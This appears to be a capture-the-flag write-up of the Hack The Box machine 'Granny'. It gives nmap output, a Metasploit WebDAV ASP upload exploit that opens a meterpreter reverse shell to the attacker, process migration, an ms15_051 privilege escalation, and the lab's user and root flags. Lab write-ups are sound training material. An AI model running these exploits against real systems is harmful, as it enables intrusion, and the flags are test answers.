+++
title = "HTB - Granny"
date = 2025-12-22
+++

#msfconsole 
### Reconnaissance
```
──(root㉿kali)-[/home/li0t]
└─# nmap -sV -sC --open -p- 10.10.10.15
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 11:33 EDT
Nmap scan report for 10.10.10.15
Host is up (0.12s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Sat, 07 Sep 2024 15:36:15 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.99 seconds

```
### Enumeration
##### 80:
- <img alt="Image" async src="images/Screenshot 2024-09-07 at 12.08.34 PM.png" width="800px"></img>
- exploit <img alt="Image" async src="images/Screenshot 2024-09-07 at 12.09.04 PM.png" width="800px"></img>
- CVE <img alt="Image" async src="images/Screenshot 2024-09-07 at 12.09.38 PM.png" width="800px"></img>
- msf module 116<img alt="Image" async src="images/Screenshot 2024-09-07 at 12.10.46 PM.png" width="800px"></img>
- Initial Access
```
msf6 > use 116
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set rhost 10.10.10.15
rhost => 10.10.10.15
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set lhost 10.10.14.3
lhost => 10.10.14.3
msf6 exploit(windows/iis/iis_webdav_upload_asp) > options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.10.15            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Checking /metasploit225911359.asp
[*] Uploading 611058 bytes to /metasploit225911359.txt...
[*] Moving /metasploit225911359.txt to /metasploit225911359.asp...
[*] Executing /metasploit225911359.asp...
[*] Deleting /metasploit225911359.asp (this doesn't always work)...
[*] Sending stage (176198 bytes) to 10.10.10.15
[!] Deletion failed on /metasploit225911359.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.15:1030) at 2024-09-07 11:45:24 -0400

meterpreter > pwd
c:\windows\system32\inetsrv

```

-privesc suggester built in!
```
msf6 > search local_exploit

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

```

- <img alt="Image" async src="images/Screenshot 2024-09-07 at 12.12.58 PM.png" width="800px"></img>
- ps and migration
```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 580   392   svchost.exe
 668   392   svchost.exe
 736   392   svchost.exe
 772   392   svchost.exe
 788   392   svchost.exe
 924   392   spoolsv.exe
 952   392   msdtc.exe
 1072  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1316  392   VGAuthService.exe
 1392  392   vmtoolsd.exe
 1500  392   svchost.exe
 1604  392   svchost.exe
 1784  392   dllhost.exe
 1896  392   alg.exe
 1904  580   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2068  344   logon.scr
 2392  2960  svchost.exe        x86   0                                      C:\WINDOWS\Temp\radA9BAF.tmp\svchost.exe
 2436  580   wmiprvse.exe
 3980  1072  cidaemon.exe
 4028  1072  cidaemon.exe
 4052  1072  cidaemon.exe

meterpreter > migrate 1904
[*] Migrating from 2392 to 1904...
[*] Migration completed successfully.
meterpreter > 

```
-Escalation
```
msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[+] Process 3012 launched.
[*] Reflectively injecting the DLL into 3012...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.3:4444 -> 10.10.10.15:1032) at 2024-09-07 12:16:50 -0400

meterpreter > 
msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[+] Process 3012 launched.
[*] Reflectively injecting the DLL into 3012...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.3:4444 -> 10.10.10.15:1032) at 2024-09-07 12:16:50 -0400

meterpreter > 

```

Lakis and Admin 
### Exploit
### User
700c5dc163014e22b3e408f8703f67d1
### Root
aa4beed1c0584445ab463a6747bd06e9